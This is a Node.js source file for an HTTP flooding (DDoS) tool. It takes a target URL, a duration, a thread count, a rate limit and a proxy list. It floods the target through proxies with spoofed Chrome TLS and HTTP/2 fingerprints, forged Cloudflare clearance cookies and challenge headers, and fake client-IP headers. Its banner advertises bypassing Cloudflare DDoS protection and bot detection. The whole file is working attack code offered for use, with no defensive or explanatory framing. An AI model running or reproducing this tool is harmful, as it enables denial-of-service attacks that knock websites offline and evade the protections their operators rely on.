const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const chalk = require('chalk');

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process
    .setMaxListeners(0)
    .on('uncaughtException', function (e) {
        console.log(e);
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('unhandledRejection', function (e) {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on('warning', e => {
        if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    })
    .on("SIGHUP", () => {
        return 1;
    })
    .on("SIGCHILD", () => {
        return 1;
    });

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let custom_table = 65535;
let custom_window = 6291456;
let custom_header = 262144;
let custom_update = 15663105;
let STREAMID_RESET = 0;
let timer = 0;
const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);
const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const reqmethod = process.argv[2];
const target = process.argv[3];
const time = parseInt(process.argv[4], 10);
setTimeout(() => {
    process.exit(1);
}, time * 1000);
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];
const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const connectFlag = process.argv.includes('--connect');
const forceHttpIndex = process.argv.indexOf('--http');
const forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length ? process.argv[forceHttpIndex + 1] == "mix" ? undefined : parseInt(process.argv[forceHttpIndex + 1]) : "2";
const debugMode = process.argv.includes('--debug') && forceHttp != 1;
const cacheIndex = process.argv.indexOf('--cache');
const enableCache = cacheIndex !== -1;
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console.clear();
    console.log(`${chalk.blue('NEW v3 Method With Luv // Updated: 06.18.2025 | Update: @nmcutiii')}`);
    console.log(`${chalk.blue('Join https://nmcutiii.info | https://nmcutiii.one to update ')}`);
    console.log(chalk.magenta.bold(`
    What's new:
      --New header for bypass HTTPDDoS Cloudflare
      --Using TLS Chrome fingerprints
      --Bypass likely human
      --Bypass bot fight mode & manage definite bots
    `));
    console.error(chalk.yellow(`
    Options:
      --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?randomstring 3 - ?q=fwfwwffw
      --cache - bypass cache cloudflare,...
      --debug - show your status code
      --delay <1-50> - Set delay
      --connect - keep proxy connection
    `));

    console.log(chalk.red.underline('How to use & example:'));
    console.log(chalk.red.bold(`node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxy>`));
    console.log(`node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --debug --cache\n`);
    process.exit(1);
}
    if (!target.startsWith('https://')) {
    console.error('Error protocol can only https://');
    process.exit(1);
}

if (!fs.existsSync(proxyfile)) {
    console.error('Proxy file does not exist');
    process.exit(1);
}

const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(line => {
    const [host, port] = line.split(':');
    return host && port && !isNaN(port);
});
if (proxy.length === 0) {
    console.error('No valid proxies');
    process.exit(1);
}

const getRandomChar = () => {
    const alphabet = 'abcdefghijklmnopqrstuvwxyz';
    const randomIndex = Math.floor(Math.random() * alphabet.length);
    return alphabet[randomIndex];
};
let randomPathSuffix = '';
setInterval(() => {
    randomPathSuffix = `${getRandomChar()}`;
}, 3333);
let hcookie = '';
const url = new URL(target);
function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);

        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

function encodeRstStream(streamId, errorCode = 0) {
    const frameHeader = Buffer.alloc(9);
    frameHeader.writeUInt32BE(4, 0); // Payload length: 4 bytes
    frameHeader.writeUInt8(3, 4); // Type: RST_STREAM (0x03)
    frameHeader.writeUInt8(0, 5); // Flags: 0
    frameHeader.writeUInt32BE(streamId, 5); // Stream ID
    const payload = Buffer.alloc(4);
    payload.writeUInt32BE(errorCode, 0);
    return Buffer.concat([frameHeader, payload]);
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

if (url.pathname.includes("%RAND%")) {
    const randomValue = randstr(6) + "&" + randstr(6);
    url.pathname = url.pathname.replace("%RAND%", randomValue);
}

function randstrr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}
function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
    return array;
}
function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const legitIP = generateLegitIP();
function generateLegitIP() {
    const asnData = [
        { asn: "AS15169", country: "US", ip: "8.8.8." },
        { asn: "AS8075", country: "US", ip: "13.107.21." },
        { asn: "AS14061", country: "SG", ip: "104.18.32." },
        { asn: "AS13335", country: "NL", ip: "162.158.78." },
        { asn: "AS16509", country: "DE", ip: "3.120.0." },
        { asn: "AS14618", country: "JP", ip: "52.192.0." },
        { asn: "AS32934", country: "US", ip: "157.240.0." },
        { asn: "AS54113", country: "US", ip: "104.244.42." },
        { asn: "AS15133", country: "US", ip: "69.171.250." }
    ];

    const data = asnData[Math.floor(Math.random() * asnData.length)];
    return `${data.ip}${Math.floor(Math.random() * 255)}`;
}

function generateAlternativeIPHeaders() {
    const headers = {};
    
    if (Math.random() < 0.5) headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    if (Math.random() < 0.4) headers["true-client-ip"] = generateLegitIP();
    if (Math.random() < 0.5) headers["via"] = `1.1 ${generateLegitIP()}`;
    if (Math.random() < 0.6) headers["request-context"] = `appId=${randstr(8)};ip=${generateLegitIP()}`;
    if (Math.random() < 0.4) headers["x-edge-ip"] = generateLegitIP();
    if (Math.random() < 0.3) headers["x-coming-from"] = generateLegitIP();
    if (Math.random() < 0.4) headers["akamai-client-ip"] = generateLegitIP();
    
    if (Object.keys(headers).length === 0) {
        headers["cdn-loop"] = `${generateLegitIP()}:${randstr(5)}`;
    }
    
    return headers;
}
function generateDynamicHeaders() {
    const secChUaFullVersion = `${getRandomInt(120, 133)}.0.${getRandomInt(4000, 6000)}.${getRandomInt(0, 100)}`;
    const platforms = ['Windows', 'macOS', 'Linux'];
    const platformVersion = `${getRandomInt(10, 14)}.${getRandomInt(0, 9)}`;
    const headerOrder = [
        'user-agent',
        'accept',
        'sec-ch-ua',
        'sec-ch-ua-mobile',
        'sec-ch-ua-platform',
        'sec-ch-ua-full-version',
        'accept-language',
        'accept-encoding',
        'sec-fetch-site',
        'sec-fetch-mode',
        'sec-fetch-dest'
    ];

    const dynamicHeaders = {
        'user-agent': fingerprint.navigator.userAgent,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'sec-ch-ua': fingerprint.navigator.sextoy,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': `"${platforms[Math.floor(Math.random() * platforms.length)]}"`,
        'sec-ch-ua-full-version': `"Chromium";v="${secChUaFullVersion}", "Google Chrome";v="${secChUaFullVersion}", "Not?A_Brand";v="${secChUaFullVersion}"`,
        'sec-ch-ua-platform-version': platformVersion,
        'sec-ch-viewport-width': getRandomInt(800, 2560).toString(),
        'sec-ch-device-memory': [2, 4, 8, 16][Math.floor(Math.random() * 4)].toString(),
        'sec-ch-dpr': (Math.random() * (2.0 - 1.0) + 1.0).toFixed(1),
        'sec-ch-prefers-color-scheme': Math.random() > 0.5 ? 'light' : 'dark',
        'accept-language': fingerprint.navigator.language,
        'accept-encoding': 'gzip, deflate, br, zstd',
        'sec-fetch-site': 'none',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-dest': 'document'
    };

    // Tạo danh sách header theo thứ tự cố định nhưng kết hợp với header động
    const orderedHeaders = headerOrder
        .filter(key => dynamicHeaders[key])
        .map(key => [key, dynamicHeaders[key]])
        .concat(Object.entries(generateAlternativeIPHeaders()));

    return orderedHeaders;
}
function generateCfClearanceCookie() {
    const timestamp = Math.floor(Date.now() / 1000);
    const challengeId = crypto.randomBytes(8).toString('hex');
    const clientId = randstr(16);
    const version = getRandomInt(17494, 17500);
    const hashPart = crypto
        .createHash('sha256')
        .update(`${clientId}${timestamp}${fingerprint.ja3}`)
        .digest('hex')
        .substring(0, 16);
    
    const cookieParts = [
        `${clientId}`,
        `${challengeId}-${version}`,
        `${timestamp}`,
        hashPart
    ];
    
    return `cf_clearance=${cookieParts.join('.')}`;
}
function generateChallengeHeaders() {
    const challengeToken = randstr(32);
    const challengeResponse = crypto
        .createHash('md5')
        .update(`${challengeToken}${fingerprint.canvas}${timestamp}`)
        .digest('hex');
    
    return [
        ['cf-chl-bypass', '1'],
        ['cf-chl-tk', challengeToken],
        ['cf-chl-response', challengeResponse.substring(0, 16)]
    ];
}
function getRandomMethod() {
    const methods = ['POST', 'HEAD', 'GET'];
    return methods[Math.floor(Math.random() * methods.length)];
}

const cache_bypass = [
    {'cache-control': 'max-age=0'},
    {'pragma': 'no-cache'},
    {'expires': '0'},
    {'x-bypass-cache': 'true'},
    {'x-cache-bypass': '1'},
    {'x-no-cache': '1'},
    {'cache-tag': 'none'},
    {'clear-site-data': '"cache"'},
];
function generateJA3Fingerprint() {
    // Danh sách cipher suites mới nhất từ Chrome (TLS 1.3 + 1.2)
    const ciphers = [
        'TLS_AES_128_GCM_SHA256',               // 0x1301
        'TLS_AES_256_GCM_SHA384',               // 0x1302
        'TLS_CHACHA20_POLY1305_SHA256',         // 0x1303
        'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256', // 0xC02B
        'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',   // 0xC02F
        'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384', // 0xC02C
        'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384',   // 0xC030
        'TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256', // 0xCCA9
        'TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256',   // 0xCCA8
        'TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA',     // 0xC013
        'TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA'      // 0xC014
    ];

    // Danh sách signature algorithms
    const signatureAlgorithms = [
        'ecdsa_secp256r1_sha256',
        'rsa_pss_rsae_sha256',
        'rsa_pkcs1_sha256',
        'ecdsa_secp384r1_sha384',
        'rsa_pss_rsae_sha384',
        'rsa_pkcs1_sha384'
    ];

    // Danh sách elliptic curves
    const curves = [
        'X25519',      // 0x001D
        'secp256r1',   // 0x0017
        'secp384r1'    // 0x0018
    ];

    // Danh sách TLS extensions (mô phỏng Chrome)
    const extensions = [
        '0',      // server_name
        '5',      // status_request
        '10',     // supported_groups
        '13',     // signature_algorithms
        '16',     // alpn
        '18',     // signed_certificate_timestamp
        '23',     // extended_master_secret
        '27',     // compress_certificate
        '35',     // session_ticket
        '43',     // supported_versions
        '45',     // psk_key_exchange_modes
        '51',     // key_share
        '65281',  // renegotiation_info
        '17513'   // application_settings
    ];

    // Ngẫu nhiên hóa danh sách
    const shuffledCiphers = shuffle([...ciphers]).slice(0, Math.floor(Math.random() * 4) + 6);
    const shuffledSigAlgs = shuffle([...signatureAlgorithms]).slice(0, Math.floor(Math.random() * 2) + 3);
    const shuffledCurves = shuffle([...curves]);
    const shuffledExtensions = shuffle([...extensions]).slice(0, Math.floor(Math.random() * 3) + 10);

    return {
        ciphers: shuffledCiphers,
        signatureAlgorithms: shuffledSigAlgs,
        curves: shuffledCurves,
        extensions: shuffledExtensions
    };
}

function generateHTTP2Fingerprint() {
    const settings = {
    HEADER_TABLE_SIZE: [4096, 16384],
    ENABLE_PUSH: [0, 1],
    MAX_CONCURRENT_STREAMS: [100, 500],
    INITIAL_WINDOW_SIZE: [65535, 262144],
    MAX_FRAME_SIZE: [16384, 65536],
    MAX_HEADER_LIST_SIZE: [8192, 32768],
    ENABLE_CONNECT_PROTOCOL: [0, 1]
};
    
    const http2Settings = {};
    for (const [key, values] of Object.entries(settings)) {
        http2Settings[key] = values[Math.floor(Math.random() * values.length)];
    }
    
    return http2Settings;
}
const ja3Fingerprint = generateJA3Fingerprint();
const http2Fingerprint = generateHTTP2Fingerprint();
function generateBrowserFingerprint() {
    const screenSizes = [
        { width: 1366, height: 768 },
        { width: 1920, height: 1080 },
        { width: 2560, height: 1440 }
    ];

    const languages = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8",
        "es-ES,es;q=0.9",
        "fr-FR,fr;q=0.9,en;q=0.8",
        "de-DE,de;q=0.9,en;q=0.8",
        "zh-CN,zh;q=0.9,en;q=0.8"
    ];

    const webGLVendors = [
        { vendor: "Google Inc. (Intel)", renderer: "ANGLE (Intel, Intel(R) UHD Graphics 620, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (NVIDIA)", renderer: "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060, Direct3D11 vs_5_0 ps_5_0)" },
        { vendor: "Google Inc. (AMD)", renderer: "ANGLE (AMD, AMD Radeon RX 580, Direct3D11 vs_5_0 ps_5_0)" }
    ];

    const tlsVersions = ['771', '772', '773'];
    const extensions = ['45', '35', '18', '0', '5', '17513', '27', '10', '11', '43', '13', '16', '65281', '65037', '51', '23', '41'];

    const screen = screenSizes[Math.floor(Math.random() * screenSizes.length)];
    const selectedWebGL = webGLVendors[Math.floor(Math.random() * webGLVendors.length)];
    let rdversion = getRandomInt(126, 133); // Giả sử getRandomInt đã được định nghĩa trong mã gốc

    const userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${rdversion}.0.0.0 Safari/537.36`;
    const canvasSeed = crypto.createHash('md5').update(userAgent + 'canvas_seed').digest('hex');
    const canvasFingerprint = canvasSeed.substring(0, 8);
    const webglFingerprint = crypto.createHash('md5').update(selectedWebGL.vendor + selectedWebGL.renderer).digest('hex').substring(0, 8);

    const generateJA3 = () => {
        const version = tlsVersions[Math.floor(Math.random() * tlsVersions.length)];
        const cipher = ja3Fingerprint.ciphers.join(':'); // Giả sử ja3Fingerprint đã được định nghĩa
        const extension = extensions[Math.floor(Math.random() * extensions.length)];
        const curve = "X25519:P-256:P-384";
        const ja3 = `${version},${cipher},${extension},${curve}`;
        return crypto.createHash('md5').update(ja3).digest('hex');
    };

    return {
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.width,
            availHeight: screen.height,
            colorDepth: 24,
            pixelDepth: 24
        },
        navigator: {
            language: languages[Math.floor(Math.random() * languages.length)],
            languages: ['en-US', 'en'],
            doNotTrack: Math.random() > 0.7 ? "1" : "0",
            hardwareConcurrency: [2, 4, 6, 8, 12, 16][Math.floor(Math.random() * 6)],
            userAgent: userAgent,
            sextoy: `"Google Chrome";v="${rdversion}", "Chromium";v="${rdversion}", "Not?A_Brand";v="24"`, // sec-ch-ua
            deviceMemory: 8,
            maxTouchPoints: 10,
            webdriver: false,
            cookiesEnabled: true
        },
        plugins: [
            Math.random() > 0.5 ? "PDF Viewer" : null,
            Math.random() > 0.5 ? "Chrome PDF Viewer" : null,
            Math.random() > 0.5 ? { name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format" } : null
        ].filter(Boolean),
        timezone: -Math.floor(Math.random() * 12) * 60,
        webgl: {
            vendor: selectedWebGL.vendor,
            renderer: selectedWebGL.renderer,
            fingerprint: webglFingerprint
        },
        canvas: canvasFingerprint,
        userActivation: Math.random() > 0.5,
        localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
        ja3: generateJA3()
    };
}
const fingerprint = generateBrowserFingerprint();
function go() {
    const [proxyHost, proxyPort] = proxy[~~(Math.random() * proxy.length)].split(':');
    let tlsSocket;

    if (!proxyHost || !proxyPort || isNaN(proxyPort)) {
        go();
        return;
    }
    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
tlsSocket = tls.connect({
    socket: netSocket,
    ALPNProtocols: ['h2', 'http/1.1'],
    servername: url.host,
    ciphers: ja3Fingerprint.ciphers.join(':'),
    sigalgs: ja3Fingerprint.signatureAlgorithms.join(':'),
    secureOptions: 
        crypto.constants.SSL_OP_NO_SSLv2 |
        crypto.constants.SSL_OP_NO_SSLv3 |
        crypto.constants.SSL_OP_NO_TLSv1 |
        crypto.constants.SSL_OP_NO_TLSv1_1 |
        crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
        crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
        crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
        crypto.constants.SSL_OP_COOKIE_EXCHANGE |
        crypto.constants.SSL_OP_SINGLE_DH_USE |
        crypto.constants.SSL_OP_SINGLE_ECDH_USE,
    secure: true,
    session: crypto.randomBytes(64),
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    ecdhCurve: ja3Fingerprint.curves.join(':'),
    supportedVersions: ['TLSv1.3', 'TLSv1.2'],
    supportedGroups: ja3Fingerprint.curves.join(':'),
    applicationLayerProtocolNegotiation: ja3Fingerprint.extensions.includes('16') ? ['h2', 'http/1.1'] : ['h2'],
    rejectUnauthorized: false,
    fingerprint: fingerprint
}, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {
                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy());
                        return;
                    }

                    function main() {
                        const method = enableCache ? getRandomMethod() : reqmethod;
                        const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
                        const h1payl = `${method} ${path}${url.search || ''} HTTP/1.1\r\nHost: ${url.hostname}\r\nUser-Agent: CheckHost (https://check-host.net)\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\n${enableCache ? 'Cache-Control: no-cache, no-store, must-revalidate\r\n' : ''}Connection: keep-alive\r\n\r\n`;
                        tlsSocket.write(h1payl, (err) => {
                            if (!err) {
                                setTimeout(() => {
                                    main();
                                }, isFull ? 1000 : 1000 / ratelimit);
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        });
                    }

                    main();

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy());
                    });
                    return;
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy());
                    return;
                }

                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(http2Fingerprint.HEADER_TABLE_SIZE);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);
                const frames1 = [];
                const frames = [
                        Buffer.from(PREFACE, 'binary'),
                        encodeFrame(0, 4, encodeSettings([
                            [1, http2Fingerprint.HEADER_TABLE_SIZE],
                            [2, http2Fingerprint.ENABLE_PUSH],
                            [3, http2Fingerprint.MAX_CONCURRENT_STREAMS],
                            [4, http2Fingerprint.INITIAL_WINDOW_SIZE],
                            [5, http2Fingerprint.MAX_FRAME_SIZE],
                            [6, http2Fingerprint.MAX_HEADER_LIST_SIZE],
                            [8, http2Fingerprint.ENABLE_CONNECT_PROTOCOL]
                        ])),
                        encodeFrame(0, 8, updateWindow)
                    ];
                frames1.push(...frames);

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type == 1) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1];
                                if (status == 403 || status == 400) {
                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => tlsSocket.destroy());
                                netSocket.end(() => netSocket.destroy());
                            }
                                if (!statuses[status])
                                    statuses[status] = 0;

                                statuses[status]++;
                            }
                            
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses['error'])
                                            statuses['error'] = 0;

                                        statuses['error']++;
                                    }
                                }

                                tlsSocket.write(encodeRstStream(0));
                                tlsSocket.end(() => tlsSocket.destroy());
                            }
                        } else {
                            break;
                        }
                    }
                });

                tlsSocket.write(Buffer.concat(frames1));
                
function main() {
    if (tlsSocket.destroyed) {
        return;
    }
    const requests = [];
    let localRatelimit = ratelimit !== undefined ? getRandomInt(1, 3) : process.argv[6];
    const startTime = Date.now();

    // Tạo batch request
    for (let i = 0; i < (isFull ? localRatelimit : 1); i++) {
        let randomNum = Math.floor(Math.random() * (10000 - 100 + 1) + 10000);
        const method = enableCache ? getRandomMethod() : reqmethod;
        const path = enableCache ? url.pathname + generateCacheQuery() : (query ? handleQuery(query) : url.pathname);
        // Tách pseudo-headers
const pseudoHeaders = [
    [":method", method],
    [":authority", url.hostname],
    [":scheme", "https"],
    [":path", path],
];

// Regular headers
const regularHeaders = generateDynamicHeaders().filter(a => a[1] != null);
// Headers bổ sung
const additionalRegularHeaders = Object.entries({
    ...(Math.random() > 0.6 && { "priority": "u=0, i" }),
    ...(Math.random() > 0.4 && { "dnt": "1" }),
    ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
    ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
    ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
    ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
}).filter(a => a[1] != null);

// Kết hợp và xáo trộn tất cả regular headers
const allRegularHeaders = [...regularHeaders, ...additionalRegularHeaders];
shuffle(allRegularHeaders);

// Kết hợp pseudo-headers với regular headers đã xáo trộn
// Kết hợp pseudo-headers với regular headers, cookie, và challenge headers
const combinedHeaders = [
    ...pseudoHeaders,
    ...allRegularHeaders,
    ['cookie', generateCfClearanceCookie()],
    ...generateChallengeHeaders()
];

// Mã hóa với HPACK
const packed = Buffer.concat([
    Buffer.from([0x80, 0, 0, 0, 0xFF]),
    hpack.encode(combinedHeaders)
]);
        const flags = 0x1 | 0x4 | 0x8 | 0x20;
        const encodedFrame = encodeFrame(streamId, 1, packed, flags);
        const frame = Buffer.concat([encodedFrame]);
        if (STREAMID_RESET >= 5 && (STREAMID_RESET - 5) % 10 === 0) {
            const rstStreamFrame = encodeRstStream(streamId, 8);
            tlsSocket.write(Buffer.concat([rstStreamFrame, frame]));
            STREAMID_RESET = 0;
        }

        requests.push(encodeFrame(streamId, 1, packed, 0x25));
        streamId += 2;
    }

    // Gửi batch request
    tlsSocket.write(Buffer.concat(requests), (err) => {
        if (err) {
            tlsSocket.end(() => tlsSocket.destroy());
            return;
        }
        // Tiếp tục vòng lặp ngay lập tức nếu chưa đủ thời gian
        const elapsed = Date.now() - startTime;
        const delay = Math.max(0, (1000 / localRatelimit) - elapsed);
        setImmediate(() => main());
    });
}
                main();
            }).on('error', () => {
                tlsSocket.destroy();
            });
        });
        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nConnection: Keep-Alive\r\nClient-IP: ${legitIP}\r\nX-Client-IP: ${legitIP}\r\nVia: 1.1 ${legitIP}\r\n\r\n`);
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go(); });
        }
    });

    netSocket.on('error', (error) => {
        cleanup(error);
    });
    
    netSocket.on('close', () => {
        cleanup();
    });
    
    function cleanup(error) {
        if (error) {
        }
        if (netSocket) {
            netSocket.destroy();
        }
        if (tlsSocket) {
            tlsSocket.end();
        }
    }
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 30) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {
    const workers = {};

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Sent Attack Successfully`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message];
    });
    if (debugMode) {
        setInterval(() => {
            let statuses = {};
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0;

                            statuses[code] += st[code];
                        }
                    }
                }
            }
            console.clear();
            console.log(`[${chalk.magenta.bold('JS/FUCKING')}] | ${chalk.bold('Time')}: [${chalk.cyan.bold(new Date().toLocaleString('en-US'))}] | ${chalk.bold('Status')}: [${chalk.cyan.bold(JSON.stringify(statuses))}]`);
        }, 1000);
    }

    setInterval(() => {
    }, 1100);

    if (!connectFlag) {
        setTimeout(() => process.exit(1), time * 1000);
    }
} else {
    if (connectFlag) {
        setInterval(() => {
            go();
        }, delay);
    } else {
        let consssas = 0;
        let someee = setInterval(() => {
            if (consssas < 30000) { 
                consssas++; 
            } else { 
                clearInterval(someee); 
                return; 
            }
            go();
        }, delay);
    }
    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift();

            statusesQ.push(statuses);
            statuses = {};
            process.send(statusesQ);
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
